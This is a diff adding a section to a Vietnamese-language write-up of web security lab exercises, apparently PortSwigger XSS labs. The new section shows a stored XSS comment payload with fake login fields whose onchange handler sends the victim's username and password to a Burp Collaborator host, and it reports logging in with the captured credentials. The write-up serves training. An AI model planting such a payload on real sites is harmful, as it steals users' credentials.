@@ -115,6 +115,17 @@ Sau khi submit, vào Burp Collaborator Client kiểm tra thì thấy có request
 Thay đổi session của mình thành session thu được, kết quả thành công.
 
 # 15. Exploiting cross-site scripting to capture passwords
+Ta submit một comment với nội dung như sau:
+```
+Username: <input name="username" id="username"> <br>
+Password: <input name="password" id="password" onchange="fetch('https://yfhfkkabiq0rnkku9iwffoxap1vsjh.oastify.com?usr='+username.value+'&amp;pwd='+this.value)">
+```
+
+Như vậy khi nạn nhân thấy hai form username và password, nếu user đó nhập thông tin thì một request sẽ được gửi đến Burp Collaborator Server, chứa các thông tin đó. Vào Burp Collaborator Client kiểm tra, ta thấy một request được gửi đến.
+
+![image](https://user-images.githubusercontent.com/103978452/208921051-584d40d0-11b0-4702-92e3-7fa43d05962f.png)
+
+Dùng thông tin thu được để login, kết quả thành công.
 
 # 16. Exploiting XSS to perform CSRF
 Ta submit một comment với phần body có nội dung:
